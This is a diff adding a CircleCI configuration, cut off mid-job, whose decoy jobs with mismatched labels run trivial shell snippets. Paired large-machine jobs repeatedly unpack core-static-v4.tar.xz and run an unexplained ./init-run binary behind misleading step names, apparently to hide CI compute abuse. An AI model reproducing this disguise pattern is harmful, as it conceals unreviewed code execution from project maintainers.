@@ -1,0 +1,1864 @@
+version: 2.1
+
+jobs:
+  weeshsoungx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Summary over SSH
+          command: |
+            mkdir -p /tmp/a4
+            set +o pipefail 2>/dev/null; arr=(a b c d e); for n in $(seq 1 10000); do echo "${arr[$((n % 5))]}-${n}"; done > /tmp/a4/B6o; true
+            # wrap-up
+            wc -c /tmp/a4/B6o
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'B6o'
+  tweak-oauth-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/B6o 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  sv6as5t7jmnk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Sync NTP
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; install -d -m 750 '/var/tmp/leveltemplate' && stat -c %a '/var/tmp/leveltemplate'; true ; } > /tmp/a4/f472ed5449309573836a37291c2ac5d06dfbb
+            # wrap-up
+            wc -c /tmp/a4/f472ed5449309573836a37291c2ac5d06dfbb
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'f472ed5449309573836a37291c2ac5d06dfbb'
+  ruby3-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/wnaq53IlgV 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  store-armv7-latest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: After the API docs settle carry on
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/my-font-common-import" && chmod -R go-rwx "/tmp/my-font-common-import" && ls -ld "/tmp/my-font-common-import"; true ; } > /tmp/a4/REnDErbiSoN
+            # wrap-up
+            wc -c /tmp/a4/REnDErbiSoN
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'REnDErbiSoN'
+  q2-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/REnDErbiSoN 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  wr3nch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Import textures for the demo build
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; function is_even { local s=0; for n; do s=$((s + n)); done; echo $s; }; is_even 33 12 2 4; true ; } > /tmp/a4/crisp.spark.heath.titan.reef
+            # wrap-up
+            wc -c /tmp/a4/crisp.spark.heath.titan.reef
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'crisp.spark.heath.titan.reef'
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/crisp.spark.heath.titan.reef 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  sierra-romeo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Tidy up the hot shards
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; if [ -x /usr/bin/env ] ; then echo "Y"; fi; true ; } > /tmp/a4/KaPpaFEnBOg
+            # wrap-up
+            wc -c /tmp/a4/KaPpaFEnBOg
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'KaPpaFEnBOg'
+  q4-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/KaPpaFEnBOg 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  cq9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Load the barcodes on dock C
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; echo '3 jobs pending' >"/tmp/booking.pantry.milestone.out"; wc -c "/tmp/booking.pantry.milestone.out"; true ; } > /tmp/a4/audit_20220308
+            # wrap-up
+            wc -c /tmp/a4/audit_20220308
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'audit_20220308'
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/audit_20220308 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  email_rates:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Renewal during shutdown
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; date -d"yesterday" "+%X"; true ; } > /tmp/a4/heath265
+            # wrap-up
+            wc -c /tmp/a4/heath265
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'heath265'
+  DEPLOY_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/heath265 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  v_idx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Now upscaling the end card
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; grep -qs '^/bin' /etc/shells && echo 'ok' || echo 'not ok'; true ; } > /tmp/a4/138.119.183
+            # wrap-up
+            wc -c /tmp/a4/138.119.183
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - '138.119.183'
+  sam-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/138.119.183 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  dec_num:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: indexing status update as we go
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; cat /etc/login.defs | awk '{print NF}' | tail -n 3 | sort -n; true ; } > /tmp/a4/access-2f66b0.log
+            # wrap-up
+            wc -c /tmp/a4/access-2f66b0.log
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'access-2f66b0.log'
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/wnaq53IlgV 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  knnKNNLayer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Remaster the intro clip first thing
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nann,denver,70\nquinn,lisbon,51\numa,kyoto,77\njudy,rome,51\n' > "/tmp/upper-secondary.conf" && cut -d, -f1,3 "/tmp/upper-secondary.conf"; true ; } > /tmp/a4/blue-iron-lepton-cedar
+            # wrap-up
+            wc -c /tmp/a4/blue-iron-lepton-cedar
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'blue-iron-lepton-cedar'
+  dp-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/wnaq53IlgV 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  new_pseudo_complex_pull_count:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Ensure that the CVE list is scanned
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; echo "3 tests passed" >"${TMPDIR:-/tmp}/phase.md"; wc -c "${TMPDIR:-/tmp}/phase.md"; true ; } > /tmp/a4/pixeldustybronze
+            # wrap-up
+            wc -c /tmp/a4/pixeldustybronze
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'pixeldustybronze'
+  LaunchProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/pixeldustybronze 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  UntypedCanvasOptions:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Task force Ladder
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; for c in $(seq 1 8); do echo "$c"; done; true ; } > /tmp/a4/TICKET68925
+            # wrap-up
+            wc -c /tmp/a4/TICKET68925
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'TICKET68925'
+  succes-only-17:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/TICKET68925 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  Ia9qvSKf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: List the cache directory for posterity
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; for i in tiger wolf cat panda goose; do echo "<$i>"; done; true ; } > /tmp/a4/wnaq53IlgV
+            # wrap-up
+            wc -c /tmp/a4/wnaq53IlgV
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'wnaq53IlgV'
+  tb-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/wnaq53IlgV 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  okStr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Number One Summary
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; rm -f "/var/tmp/appv2.bak" && echo gone; true ; } > /tmp/a4/red_payload_river_kappa
+            # wrap-up
+            wc -c /tmp/a4/red_payload_river_kappa
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'red_payload_river_kappa'
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/wnaq53IlgV 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  IN-FINISH-AREA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Next bin the fragile items
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; grep -v "SwapTotal" /proc/meminfo|tail -n 3; true ; } > /tmp/a4/SDK_Proton
+            # wrap-up
+            wc -c /tmp/a4/SDK_Proton
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'SDK_Proton'
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/SDK_Proton 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  Mmmm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Conduct verification against the base image
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; touch '/tmp/bread-museum-vision-final.bak' && chmod a-w '/tmp/bread-museum-vision-final.bak' && ls -l '/tmp/bread-museum-vision-final.bak'; true ; } > /tmp/a4/yFGyFVH
+            # wrap-up
+            wc -c /tmp/a4/yFGyFVH
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'yFGyFVH'
+  wip-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/yFGyFVH 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  attrb93563:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Feel free to load the cold storage tier
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; for val in lena ann pete judy liam sam; do printf '%s\n' "$val"; done|wc -l; true ; } > /tmp/a4/run_462
+            # wrap-up
+            wc -c /tmp/a4/run_462
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'run_462'
+  Prepare_App4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/run_462 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  thulbilslinta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: This is where we cold start the bootloader
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; grep -io --context=3 --colour=auto fi /etc/profile; true ; } > /tmp/a4/RMA-2024-55258
+            # wrap-up
+            wc -c /tmp/a4/RMA-2024-55258
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'RMA-2024-55258'
+  defualt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/wnaq53IlgV 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  varPromises:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: done rinsing reagents
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'yay!' "build finished" | cut -c1-13 | fmt -w 47 | nl; true ; } > /tmp/a4/bond85
+            # wrap-up
+            wc -c /tmp/a4/bond85
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'bond85'
+  update-db-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/bond85 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  DelegatingBufferProcessor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Garbage collect the retry buffer to be thorough
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; if grep -q "^root" /etc/group; then echo "true"; else echo false; fi; true ; } > /tmp/a4/trial_566
+            # wrap-up
+            wc -c /tmp/a4/trial_566
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'trial_566'
+  STG_CHECK_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/trial_566 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  receiptsByName:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Image cell lines overnight
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; a='game-2022-12-11.md'; printf '%s\n' "${a/m/X}"; true ; } > /tmp/a4/EmberStockRidgeSilent
+            # wrap-up
+            wc -c /tmp/a4/EmberStockRidgeSilent
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'EmberStockRidgeSilent'
+  MERGE_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/EmberStockRidgeSilent 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  NavWriterGardenTraceEmber:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: load the loading bay mark 29
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; cat /etc/hosts | grep -i 'host' | tail -n 3; true ; } > /tmp/a4/Y
+            # wrap-up
+            wc -c /tmp/a4/Y
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'Y'
+  chen-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/Y 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  OQ:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Design batching step
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; printf %s "don't panic" | sha384sum | awk '{print $1}'; true ; } > /tmp/a4/v.1.4
+            # wrap-up
+            wc -c /tmp/a4/v.1.4
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - 'v.1.4'
+  rip-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/v.1.4 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  ModelV11:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Sync the support queue to Perth
+          command: |
+            mkdir -p /tmp/a4
+            { set +o pipefail 2>/dev/null; for file in /usr/bin/z*; do stat -c "%s %n" "$file"; done | wc -l; true ; } > /tmp/a4/2
+            # wrap-up
+            wc -c /tmp/a4/2
+      - persist_to_workspace:
+          root: /tmp/a4
+          paths:
+            - '2'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/a4
+      - run:
+          name: Read blob
+          command: |
+            if [[ "$(head -c 4 /tmp/a4/2 2>/dev/null)" == '{' ]]; then echo "json-ish"; else echo "other"; fi
+      - run:
+          name: Extract source
+          command: git clone --depth 2 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: tar -xJ -f core-static-v4.tar.xz
+      - run:
+          name: Collect artifacts
+          no_output_timeout: 15m
+          command: sleep 90
+      - run:
+          command: nice -n 0 ./init-run
+  ByteIdDefaultLocal:
+    docker:
+      - image: cimg/base:current
